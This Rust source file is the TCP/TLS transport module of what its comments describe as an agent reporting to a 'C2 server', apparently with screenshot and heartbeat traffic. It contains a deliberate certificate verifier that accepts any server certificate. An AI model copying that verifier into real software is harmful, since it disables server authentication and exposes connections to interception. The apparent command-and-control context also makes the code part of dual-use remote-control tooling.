//! Network Service - TCP/TLS communication
//!
//! Compiles in two modes:
//! - default (no features): plain TCP
//! - `tls` feature: TCP wrapped with rustls (accepts self-signed certs)

use crate::kernel::Plugin;
use crate::protocol::{ServerCommand, ServerHello};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::mpsc;
use std::time::Duration;

macro_rules! nlog { ($($arg:tt)*) => {{}} }

#[cfg(feature = "tls")]
use rustls::{ClientConfig, ClientConnection, StreamOwned};
#[cfg(feature = "tls")]
use std::sync::Arc;

// Inner stream type: plain TCP or TLS-wrapped
#[cfg(not(feature = "tls"))]
type InnerStream = TcpStream;

#[cfg(feature = "tls")]
type InnerStream = StreamOwned<ClientConnection, TcpStream>;

pub struct NetworkService {
    stream: Option<InnerStream>,
    write_tx: Option<mpsc::Sender<Vec<u8>>>,
    write_handle: Option<std::thread::JoinHandle<()>>,
}

impl NetworkService {
    pub fn new() -> Self {
        Self { stream: None, write_tx: None, write_handle: None }
    }

    fn is_read_timeout_kind(kind: std::io::ErrorKind) -> bool {
        matches!(kind, std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut)
    }

    // --- connect: TCP ---

    #[cfg(not(feature = "tls"))]
    pub fn connect(&mut self, addr: &str) -> bool {
        match TcpStream::connect(addr) {
            Ok(s) => {
                s.set_read_timeout(Some(Duration::from_secs(30))).ok();
                let _ = s.set_nodelay(true);
                nlog!("NET connect OK to {}, nodelay=true", addr);
                // Clone the stream: main loop reads from one handle,
                // dedicated write thread writes to the other.
                let write_stream = match s.try_clone() {
                    Ok(ws) => ws,
                    Err(_) => return false,
                };
                let (tx, rx) = mpsc::channel::<Vec<u8>>();
                let handle = std::thread::spawn(move || {
                    write_thread(write_stream, rx);
                });
                self.write_tx = Some(tx);
                self.write_handle = Some(handle);
                self.stream = Some(s);
                true
            }
            Err(e) => {
                nlog!("NET connect FAIL to {}: {}", addr, e);
                false
            }
        }
    }

    // --- connect: TLS ---

    #[cfg(feature = "tls")]
    pub fn connect(&mut self, addr: &str) -> bool {
        let tcp = match TcpStream::connect(addr) {
            Ok(s) => {
                s.set_read_timeout(Some(Duration::from_secs(30))).ok();
                s
            }
            Err(_) => return false,
        };

        let config = build_tls_client_config();
        let server_name = rustls::pki_types::ServerName::try_from("hermes")
            .expect("valid server name");
        let conn = match ClientConnection::new(Arc::new(config), server_name) {
            Ok(c) => c,
            Err(_) => return false,
        };

        let mut stream = StreamOwned::new(conn, tcp);

        // Drive TLS handshake to completion
        while stream.conn.is_handshaking() {
            if stream.conn.complete_io(&mut stream.sock).is_err() {
                return false;
            }
        }

        // TLS streams don't support try_clone, so for TLS we fall back
        // to direct writes (same as before). The write-thread path is
        // only used for plain TCP.
        self.stream = Some(stream);
        self.write_tx = None;
        self.write_handle = None;
        true
    }

    // --- timeout helpers ---

    #[cfg(not(feature = "tls"))]
    fn set_stream_read_timeout(stream: &mut InnerStream, timeout: Duration) -> std::io::Result<()> {
        stream.set_read_timeout(Some(timeout))
    }

    #[cfg(feature = "tls")]
    fn set_stream_read_timeout(stream: &mut InnerStream, timeout: Duration) -> std::io::Result<()> {
        stream.sock.set_read_timeout(Some(timeout))
    }

    // --- send (works for both modes via Write trait) ---

    pub fn send(&mut self, msg: &impl serde::Serialize) -> Result<(), ()> {
        let json = serde_json::to_string(msg).map_err(|_| ())?;
        nlog!("NET SEND: {} bytes: {}", json.len(), &json[..json.len().min(200)]);
        // Non-TLS path: push to write thread channel (non-blocking)
        if let Some(tx) = &self.write_tx {
            let mut line = json.into_bytes();
            line.push(b'\n');
            return tx.send(line).map_err(|_| {
                nlog!("NET SEND ERR: write channel closed");
            });
        }
        // TLS fallback (or no write thread): direct write
        let stream = self.stream.as_mut().ok_or(())?;
        let result = writeln!(stream, "{}", json);
        match &result {
            Ok(()) => nlog!("NET SEND OK"),
            Err(e) => nlog!("NET SEND ERR: {}", e),
        }
        result.map_err(|_| ())
    }

    // --- read_line ---

    pub fn read_line(&mut self, timeout: Duration) -> Result<Option<String>, ()> {
        let stream = self.stream.as_mut().ok_or(())?;
        Self::set_stream_read_timeout(stream, timeout).map_err(|e| {
            nlog!("read_line: set_timeout err: {}", e);
        })?;

        let mut buf = Vec::new();
        let mut byte = [0u8; 1];

        loop {
            match stream.read(&mut byte) {
                Ok(0) => {
                    nlog!("read_line: EOF (server closed)");
                    return Ok(None);
                }
                Ok(1) => {
                    if byte[0] == b'\n' {
                        while buf.last() == Some(&b'\r') {
                            buf.pop();
                        }
                        return Ok(Some(String::from_utf8_lossy(&buf).to_string()));
                    }
                    buf.push(byte[0]);
                }
                Err(ref e) if Self::is_read_timeout_kind(e.kind()) => {
                    if buf.is_empty() {
                        return Err(());
                    }
                }
                Err(ref e) => {
                    nlog!("read_line: fatal err: {} (kind={:?})", e, e.kind());
                    return Ok(None);
                }
                Ok(_) => unreachable!(),
            }
        }
    }

    // --- receive_hello ---

    pub fn receive_hello(&mut self) -> Option<ServerHello> {
        let stream = self.stream.as_mut()?;
        Self::set_stream_read_timeout(stream, Duration::from_secs(5)).ok();
        nlog!("receive_hello: waiting up to 5s");

        let mut buf = Vec::new();
        let mut byte = [0u8; 1];

        loop {
            match stream.read(&mut byte) {
                Ok(0) => {
                    nlog!("receive_hello: EOF");
                    return None;
                }
                Ok(1) => {
                    if byte[0] == b'\n' {
                        while buf.last() == Some(&b'\r') {
                            buf.pop();
                        }
                        let line = String::from_utf8_lossy(&buf).to_string();
                        nlog!("receive_hello: got line: {}", &line[..line.len().min(200)]);
                        let cmd: ServerCommand = serde_json::from_str(&line).ok()?;
                        match cmd {
                            ServerCommand::Hello {
                                session_nonce,
                                auth_mode,
                                ..
                            } => {
                                nlog!("receive_hello: parsed Hello");
                                return Some(ServerHello {
                                    session_nonce,
                                    auth_mode,
                                });
                            }
                            other => {
                                nlog!("receive_hello: got non-Hello command, ignoring");
                                return None;
                            }
                        }
                    }
                    buf.push(byte[0]);
                }
                Err(ref e) => {
                    nlog!("receive_hello: read err: {} (kind={:?})", e, e.kind());
                    return None;
                }
                Ok(_) => unreachable!(),
            }
        }
    }

    // --- addr helpers ---

    #[cfg(not(feature = "tls"))]
    pub fn local_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.local_addr().ok())
    }

    #[cfg(feature = "tls")]
    pub fn local_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.sock.local_addr().ok())
    }

    #[cfg(not(feature = "tls"))]
    pub fn peer_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.peer_addr().ok())
    }

    #[cfg(feature = "tls")]
    pub fn peer_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.sock.peer_addr().ok())
    }
}

// --- TLS config ---

#[cfg(test)]
mod tests {
    use super::NetworkService;

    #[test]
    fn read_timeouts_include_windows_timed_out() {
        assert!(NetworkService::is_read_timeout_kind(std::io::ErrorKind::WouldBlock));
        assert!(NetworkService::is_read_timeout_kind(std::io::ErrorKind::TimedOut));
        assert!(!NetworkService::is_read_timeout_kind(std::io::ErrorKind::UnexpectedEof));
    }
}

// --- TLS config: accept any certificate (self-signed) ---
//
// SECURITY POSTURE: encryption without authentication.
//
// This verifier accepts *any* server certificate, including self-signed ones.
// The rationale:
//
// 1. The C2 server generates its own self-signed cert at first boot. There is
//    no public CA infrastructure to validate against, and pinning a cert hash
//    at compile time would break every time the server rotates its cert.
//
// 2. The agent already authenticates at the application layer via the
//    agent token / HMAC challenge-response handshake (see `protocol.rs`).
//    TLS here provides *transport encryption* (confidentiality + integrity),
//    not server identity verification.
//
// 3. An active MITM attacker who presents their own cert would still need
//    a valid agent token to complete registration. The token is the auth
//    boundary, not the TLS cert.
//
// If the deployment model changes to use CA-signed certs or cert pinning,
// replace this verifier with the default rustls `WebPkiVerifier`.

#[cfg(feature = "tls")]
fn build_tls_client_config() -> ClientConfig {
    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
    use rustls::crypto::ring::default_provider;
    use rustls::{DigitallySignedStruct, Error, SignatureScheme};

    /// Verifier that accepts any server certificate.
    ///
    /// This is intentional: the C2 server uses self-signed certs, and the
    /// real authentication happens at the application layer (agent token /
    /// HMAC challenge-response). See the block comment above for the full
    /// security rationale.
    #[derive(Debug)]
    struct AcceptAnyCert;

    impl ServerCertVerifier for AcceptAnyCert {
        fn verify_server_cert(
            &self,
            _end_entity: &rustls::pki_types::CertificateDer<'_>,
            _intermediates: &[rustls::pki_types::CertificateDer<'_>],
            _server_name: &rustls::pki_types::ServerName<'_>,
            _ocsp_response: &[u8],
            _now: rustls::pki_types::UnixTime,
        ) -> Result<ServerCertVerified, Error> {
            Ok(ServerCertVerified::assertion())
        }

        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &rustls::pki_types::CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &rustls::pki_types::CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            vec![
                SignatureScheme::RSA_PKCS1_SHA256,
                SignatureScheme::RSA_PKCS1_SHA384,
                SignatureScheme::RSA_PKCS1_SHA512,
                SignatureScheme::ECDSA_NISTP256_SHA256,
                SignatureScheme::ECDSA_NISTP384_SHA384,
                SignatureScheme::RSA_PSS_SHA256,
                SignatureScheme::RSA_PSS_SHA384,
                SignatureScheme::RSA_PSS_SHA512,
                SignatureScheme::ED25519,
                SignatureScheme::ED448,
            ]
        }
    }

    let provider = default_provider();
    let _ = provider.clone().install_default();

    ClientConfig::builder_with_provider(Arc::new(provider))
        .with_safe_default_protocol_versions()
        .unwrap()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAnyCert))
        .with_no_client_auth()
}

/// Dedicated write thread: consumes serialized messages from a channel
/// and writes them to the TCP stream.  Runs until the channel is closed
/// (i.e. the `NetworkService` is dropped or the connection is reset).
///
/// This decouples the main loop from slow TCP writes — a multi-MB
/// screenshot result no longer blocks heartbeat sending.
#[cfg(not(feature = "tls"))]
fn write_thread(mut stream: TcpStream, rx: mpsc::Receiver<Vec<u8>>) {
    stream.set_write_timeout(Some(Duration::from_secs(60))).ok();
    while let Ok(data) = rx.recv() {
        if stream.write_all(&data).is_err() {
            break;
        }
    }
}

impl Plugin for NetworkService {
    fn name(&self) -> &'static str {
        "network"
    }
}

impl Default for NetworkService {
    fn default() -> Self {
        Self::new()
    }
}
